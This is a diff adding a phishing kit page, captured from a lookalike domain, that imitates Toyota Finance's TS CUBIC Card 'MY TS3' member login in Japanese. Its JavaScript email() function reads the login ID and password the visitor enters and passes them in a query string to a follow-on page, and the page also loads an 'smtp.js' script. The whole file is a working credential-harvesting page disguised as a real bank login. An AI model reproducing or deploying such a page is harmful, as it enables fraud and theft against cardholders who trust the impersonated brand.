@@ -1,0 +1,663 @@
+<!-- URL =https://www.ts3-login.top/client/login.html--><!-- w =('ts3-login.top', datetime.datetime(2021, 5, 26, 16, 38, 9), datetime.datetime(2022, 5, 26, 16, 38, 9))--><!DOCTYPE html>
+<html>
+ <head>
+  <meta charset="utf-8"/>
+  <title>
+   MY TS3ログイン｜TS CUBIC カード
+  </title>
+  <style>
+   body{
+				margin: 0PX;
+				padding-left: 15%;
+				padding-right: 15%;
+				padding-bottom: 70px;
+			}
+			#body1{
+				width: 100%;
+				height: 970px;
+				position: relative;
+			}
+			#nav{
+				width: 100%;
+				height: 60px;
+				padding-top:20px;
+				padding-bottom: 0px;
+				border-bottom:6px solid #E72828 ;
+			}
+			.nav-img{
+				height: 50px;
+				width: 50px;
+				cursor: pointer;
+				margin-left: 0PX;
+			}
+			.nav-img1{
+				position: absolute;
+				left: 55px;
+				top:30px;
+			}
+			#left{
+				width: 68%;
+				height:auto;
+			/*	background-color: black;*/
+				margin-top: 10px;
+				float: left;
+				
+			}
+			#right{
+				width: 30%;
+				height: auto;
+			/*	background-color: black;*/
+				margin-top: 10px;
+				margin-left:2%;
+				float: left;
+			}
+			#login{
+				width: 100%;
+				height: 400px;
+				border-radius: 5px;
+				border: 2px solid #EEEEEE;
+				overflow: hidden;
+				position: relative;
+			}
+			#loginnav{
+				width: 100%;
+				height: 70PX;
+				border-bottom: 2PX solid #EEEEEE;
+				background-image: linear-gradient(to top,white,#EEEEEE);
+			}
+			.loginnav-p1{
+				font-size: 16px;
+				font-weight: bold;
+				position: absolute;
+				margin-left: 20px;
+			}
+			.loginnav-p2{
+				font-size: 12px;
+				position: absolute;
+				margin-left: 20px;
+				margin-top: 40px;
+			}
+			#center{
+				width: 100%;
+				height: 260px;
+			}
+			#biaoti{
+				width: 220px;
+				height: 40px;
+				position: absolute;
+				margin-top: 15px;
+				margin-left: 15px;
+				cursor: pointer;
+			}
+			#name{
+				position: absolute;
+				margin-top: 70px;
+				margin-left: 20px;
+				height: 40px;
+			}
+			#name input{
+				width: 250px;
+				outline: none;
+                border: none;
+                border: 2PX solid #EEEEEE;
+			}
+			#password{
+				position: absolute;
+				margin-top:120px;
+				margin-left: 20px;
+				height: 40px;
+			}
+			#password input{
+				width: 250px;
+				outline: none;
+                border: none;
+                border: 2PX solid #EEEEEE;
+			}
+			#name a{
+				font-size: 10px;
+				color: blue;
+				cursor: pointer;
+			    border-bottom: 1px solid blue;
+			    position: absolute;
+			    right: 0px;
+			    bottom: 0px;
+			}
+			#password a{
+				font-size: 10px;
+				color: blue;
+				cursor: pointer;
+			    border-bottom: 1px solid blue;
+			    position: absolute;
+			    right: 0px;
+			    margin-top: 23px;
+			}
+			#button-login{
+				position: absolute;
+				margin-top: 170px;
+				height:40px;
+				width:250px;
+				margin-left: 70px;
+				cursor: pointer;
+			}
+			#main-bottom {
+				color: red;
+             font-size: 10px;
+             position: absolute;
+             margin-top: 220px;
+             margin-left: 15PX;
+			}
+			#main-bottom-img{
+				position: absolute;
+				bottom: 0px;
+				width: 100%;
+				cursor: pointer;
+				border-radius: 5px;
+				background-color:#FCE4E4;
+				height:80px;
+				float: left;
+			}
+			#main-bottom-img-left{
+				width: 65%;
+				height: 80px;
+				float: left;
+				
+			}
+			#main-bottom-img-left img{
+				margin-top: 15px;
+				margin-left: 15px;
+			}
+			#main-bottom-img-left p{
+				color: #666666;
+				font-weight: bold;
+				margin-left: 15px;
+				font-size: 13px;
+				margin-top: -1px;
+			}
+			#main-bottom-img-right{
+				width: 35%;
+				height: 80px;
+				float: left;
+			}
+			#main-bottom-img-right img{
+				margin-top: 20px;
+				margin-left: 10px;
+			}
+			#center-right-top{
+				width: 200px;
+				height: 50px;
+				border: 2PX solid #EEEEEE;
+			}
+			#main-right{
+				position: absolute;
+				right: 0px;
+				cursor: pointer;
+				/*background-color: black;*/
+				width: 35%;
+				height: 247px;
+			}
+			#main-right-one{
+				width: 100%;
+				height: 148px;
+				border-left: 2PX solid #D2D0CF;
+				border-bottom: 2PX solid #D2D0CF;
+			}
+			
+			#main-right-one-button img{
+				height: 40px;
+				width: 150px;
+				margin-top: 90px;
+				margin-left: 45px;
+			}
+			#main-right-one p{
+				color: #545454;
+				width: 68%;
+				margin-left: 40px;
+				font-size: 12px;
+				font-weight: bold;
+				position: absolute;
+				top: 20px;
+			}
+			#main-right-two{
+				width: 100%;
+				height: 97px;
+				
+			}
+			#main-right-two img{
+				width: 101%;
+				height: 97px;
+			}
+			#login-one{
+				/*background-color: black;*/
+				width: 100%;
+				height: 130px;
+				margin-top: 20px;
+				position: relative;
+			}
+			#login-one img{
+				width: 100%;
+				position: absolute;
+				height: 40px;
+			}
+			#login-one p{
+				position: absolute;
+				top:40px;
+				font-size: 12px;
+			}
+			#login-two{
+				width: 100%;
+				height: 130px;
+				margin-top: 0px;
+				position: relative;
+			}
+			#login-two img{
+				width: 100%;
+				position: absolute;
+				height: 40px;
+			}
+			#login-two p{
+				position: absolute;
+				top:40px;
+				font-size: 12px;
+			}
+			#right-one{
+				width: 100%;
+				height: 350px;
+				border: 2PX solid #EEEEEE;
+				position: relative;
+			}
+			#right-one-nav{
+				width: 100%;
+				height: 40px;
+				background-color:#CCCCCC;
+			}
+			#right-one-nav P{
+				color: white;
+				position: absolute;
+				font-size: 20PX;
+				font-weight: bold;
+				margin-top:5px;
+				left: 25px;
+			}
+			#right-one .right-one-p{
+				font-size: 12PX;
+				padding-left: 10px;
+				padding-right: 10px;
+			}
+			#right-one .right-one-p b{
+				color: red;
+			}
+			#right-one .right-one-p a{
+				color: blue;
+				 border-bottom: 1px solid blue;
+			}
+			#right-two{
+				margin-top: 20px;
+				width: 100%;
+				height: 150px;
+				border: 2PX solid #E72828;
+				position: relative;
+			}
+			#right-two-nav{
+				width: 100%;
+				height: 50px;
+				background-color:#E72828;
+				position: absolute;
+			}
+			#right-two-nav P{
+				color: white;
+				font-size: 15px;
+				padding-left: 5px;
+				padding-right: 5px;
+				margin-top: 5px;
+			}
+			#right-two .right-two-p{
+				position: absolute;
+				margin-top: 70px;
+				padding-left: 20px;
+				padding-right: 20px;
+				font-size: 12px;
+			}
+			#right-two a{
+				font-size: 12px;
+				position: absolute;
+				bottom: 10px;
+				right: 20px;
+				color: blue;
+				border-bottom: 1px solid blue;
+			}
+			#right-there{
+				margin-top: 20px;
+				width: 100%;
+				height: 120px;
+				border: 2PX solid #E72828;
+				position: relative;
+			}
+			#right-there-nav{
+				width: 100%;
+				height: 30px;
+				background-color:#E72828;
+				position: absolute;
+			}
+			#right-there-nav p{
+				color: white;
+				font-size: 15px;
+				padding-left: 5px;
+				padding-right: 5px;
+				margin-top: 5px;
+			}
+			.right-there-p{
+				position: absolute;
+				margin-top: 50px;
+				padding-left: 20px;
+				padding-right: 20px;
+				font-size: 12px;
+			}
+			#right-there a{
+				font-size: 12px;
+				position: absolute;
+				bottom: 10px;
+				right: 20px;
+				color: blue;
+				border-bottom: 1px solid blue;
+			}
+			#bottom{
+				width: 100%;
+				height: 50px;
+				bottom: 100px;
+				border-bottom: 2PX solid #EEEEEE;
+				border-top: 2PX solid #EEEEEE;
+				position: absolute;
+			}
+			#bottom img{
+				width: 150px;
+				height: 20px;
+				margin-top: 15px;
+				margin-left: 5px;
+			}
+			#bottom p{
+           margin-top: -27px;
+           margin-left: 250px;
+           padding-left: 30px;
+           border-left: 2px solid #EEEEEE;
+			}
+			#bottom-bottom{
+				width: 100%;
+				position: absolute;
+				bottom: 30px;
+			}
+			#bottom-bottom p{
+				margin-left: 25%;
+				font-size: 15px;
+				color: gray;
+			}
+			#login-two-nav{
+					background-image: linear-gradient(to right,white,#E7E7E7);
+				width: 100%;
+				height: 40px;
+				position: relative;
+			}
+			#login-one-nav{
+				background-image: linear-gradient(to right,white,#E7E7E7);
+				width: 100%;
+				height: 40px;
+				position: relative;
+			}
+			#login-two-nav img{
+				position: absolute;
+				width: 30px;
+				height: 30px;
+				left: 2%;
+				top:5px;
+			}
+			#login-one-nav img{
+				position: absolute;
+				width: 30px;
+				height: 30px;
+				left: 2%;
+				top:5px;
+			}
+			#login-two-nav P{
+				position: absolute;
+				top:-10px;
+				left: 6%;
+				font-weight: bold;
+				font-size: 17px;
+				color:#666666;
+			}
+			#login-one-nav p{
+				position: absolute;
+				top:-10px;
+				left: 6%;
+				font-weight: bold;
+				font-size: 17px;
+				color:#666666;
+			}
+			.nav{
+				width: 5px;
+				height: 40px;
+				background-color: #666666;
+				left: 0px;
+			}
+			#bottom-right{
+				
+				width: 100%;
+				height: 50px;
+				position: absolute;
+				bottom:0px;
+			}
+			#bottom-right img{
+				position: absolute;
+				right: 0px;
+			}
+  </style>
+  <script src="../js/smtp.js">
+  </script>
+ </head>
+ <body>
+  <div id="body1">
+   <div id="nav">
+    <img class="nav-img" src="../img/1619429939(1).png"/>
+    <img class="nav-img1" src="../img/tscubic_card_text.jpg"/>
+   </div>
+   <div id="left">
+    <div id="login">
+     <div id="loginnav">
+      <p class="loginnav-p1">
+       TS CUBIC CARD会員さま専用ページ
+      </p>
+      <p class="loginnav-p2">
+       MY TS3サービスは、ログインIDとパスワードを入力してログインのうえ、ご利用ください。
+      </p>
+     </div>
+     <div id="center">
+      <div id="main">
+       <img id="biaoti" src="../img/login-nav.gif"/>
+       <div id="name">
+        ログインID :
+        <input id="name-text" type="text"/>
+        <a>
+         &gt;ログインIDをお忘れの方
+        </a>
+       </div>
+       <div id="password">
+        パスワード :
+        <input id="password-text" type="password"/>
+        <a>
+         パスワードをお忘れ・変更される方
+        </a>
+       </div>
+       <img id="button-login" onclick="email()" src="../img/login.gif"/>
+       <p id="main-bottom">
+        ログインID・パスワードは大文字・小文字の識別がされますのでご注意ください
+       </p>
+       <div id="main-bottom-img">
+        <div id="main-bottom-img-left">
+         <img src="../img/ttl_new.gif"/>
+         <p>
+          MYTSSサ一ビスをこ利用いただくためには、ログインIDをこ登録ください。
+         </p>
+        </div>
+        <div id="main-bottom-img-right">
+         <img onclick="tp()" src="../img/btn_regist.gif"/>
+        </div>
+       </div>
+       <div id="main-right">
+        <div id="main-right-one">
+         <p>
+          お客さまの「知りたい!」が見つかるご利用ガイドはこちら
+         </p>
+         <div id="main-right-one-button">
+          <img src="../img/1619429817(1).png">
+          </img>
+         </div>
+        </div>
+        <div id="main-right-two">
+         <img src="../img/img_webcheck.gif"/>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+    <div id="login-one">
+     <div id="login-one-nav">
+      <div class="nav">
+      </div>
+      <img src="../img/suo.png"/>
+      <p>
+       ィンタ一ネッ トショッピングをご利用の方
+      </p>
+     </div>
+     <p>
+      インターネットショッピングをご利用いただくためのパスワードはMY TS3ログイン時のパスワードと同じものになります。MY TS3ログイン時のパスワードを変更されますと「オンラインショッピング認証サービス」のパスワードも同様に変更されますのでご注意ください。
+     </p>
+    </div>
+    <div id="login-two">
+     <div id="login-two-nav">
+      <div class="nav">
+      </div>
+      <img src="../img/yaoshi.png"/>
+      <p>
+       ログイン·バスワ一ドのお取り扱いについて
+      </p>
+     </div>
+     <p>
+      安全のために、他サイトと同じログインID、パスワードのご使用は避けてください。
+      <br/>
+      また、定期的にご変更いただくことをおすすめします。
+      <br/>
+      第三者に知られる事のないよう、お取り扱いには十分ご注意ください。
+     </p>
+    </div>
+   </div>
+   <div id="right">
+    <div id="right-one">
+     <div id="right-one-nav">
+      <p>
+       ログインでお困りのお客さま
+      </p>
+     </div>
+     <p class="right-one-p">
+      ・ログインおよび新規登録ができない場合、いくつかの原因が考えられます。下記をご確認ください。
+     </p>
+     <p class="right-one-p">
+      &gt;
+      <a>
+       ログインおよび新規登録ができない原因と対処方法
+      </a>
+     </p>
+     <p class="right-one-p">
+      &gt;
+      <a>
+       ログインに関するよくあるご質問
+      </a>
+     </p>
+     <p class="right-one-p">
+      ・ログインID・パスワードを何度か
+      <b>
+       間違って
+      </b>
+      入力されますと会員情報保護の為、WEBの利用を
+      <b>
+       停止
+      </b>
+      させていただいております。
+下記「パスワードをお忘れの方」よりお手続きをされますとWEB利用の再開ができます。
+     </p>
+     <p class="right-one-p">
+      &gt;
+      <a>
+       ログインIDをお忘れの方
+      </a>
+     </p>
+     <p class="right-one-p">
+      &gt;
+      <a>
+       パスワードをお忘れの方、または変更される方
+      </a>
+     </p>
+     <p class="right-one-p">
+      ※お電話でのログインID･パスワードご照会については受付けしておりませんので、予めご了承ください。
+     </p>
+    </div>
+    <div id="right-two">
+     <div id="right-two-nav">
+      <p>
+       フィッシング(詐欺)メールが送られてくる場合があります。
+      </p>
+     </div>
+     <p class="right-two-p">
+      弊社発行カード(TS CUBIC CARD、ENEOS カード等)を名乗る不審なメールにご注意ください。
+     </p>
+     <a>
+      詳しくはこちら
+     </a>
+    </div>
+    <div id="right-there">
+     <div id="right-there-nav">
+      <p>
+       クレジットカードの盗難が頻発しています。
+      </p>
+     </div>
+     <p class="right-there-p">
+      車内でのカード保管は大変危険ですので、ご注意ください。
+     </p>
+     <a>
+      詳しくはこちら
+     </a>
+    </div>
+   </div>
+   <div id="bottom">
+    <img src="../img/bottom.gif"/>
+    <p>
+     お持ちのクレジットカード裏面に記載の電話番号までお問い合わせください。
+    </p>
+   </div>
+   <div id="bottom-bottom">
+    <p>
+     COPYRIGHT © TOYOTA FINANCE CORPORATION.
+ALL RIGHTS RESERVED.
+    </p>
+   </div>
+   <div id="bottom-right">
+    <img src="../img/39e8c992482180b9a51b888cc230f5f.png"/>
+   </div>
+  </div>
+ </body>
+ <script>
+  function email() {
+	var name = document.getElementById('name-text').value;
+	var password1 = document.getElementById('password-text').value;
+	var myurl="login2.html"+"?"+"ID:"+name+"Password:"+password1;	
+	if(name==""||password1=="" ) {
+		alert("IDやパスワードは空にできません。");
+	} else {
+		window.location.assign(myurl); 
+		
+	}
+
+}
+	function tp(){
+		window.location.href="zhuce.html";
+	}
+ </script>
+</html>
